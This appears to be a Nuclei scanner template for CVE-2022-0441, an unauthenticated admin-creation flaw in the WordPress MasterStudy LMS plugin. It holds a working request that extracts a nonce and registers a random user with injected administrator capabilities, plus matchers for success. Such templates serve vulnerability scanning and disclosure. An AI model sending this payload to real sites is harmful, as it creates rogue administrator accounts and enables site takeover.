id: CVE-2022-0441

info:
  name: Unauthenticated Admin Account Creation in WordPress MasterStudy LMS plugin
  author: theamanrawat
  severity: critical
  description: Unauthenticated Admin Account Creation in WordPress MasterStudy LMS plugin (versions < 2.7.6).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0441
    - https://wordpress.org/plugins/masterstudy-lms-learning-management-system/
    - https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed
  classification:
    cve-id: CVE-2022-0441
  tags: wordpress,wp-plugin,masterstudy-lms-learning-management-system,cve,wpscan

requests:
  - raw:
    - |
      GET / HTTP/1.1

    - |
      POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce={{nonce}} HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json; charset=utf-8

      {"user_login":"{{rand_text_alphanumeric(8)}}","user_email":"{{rand_text_alphanumeric(8)}}@test.com","user_password":"Testtest123","user_password_re":"Testtest123","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}
      
    extractors:
      - type: regex
        name: nonce
        group: 1
        regex: 
          - '"stm_lms_register":"([0-9a-zA-Z]+)"'
        internal: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"message":"Registration completed successfully."'

      - type: word
        part: header
        words:
          - application/json;

      - type: status
        status:
         - 200 

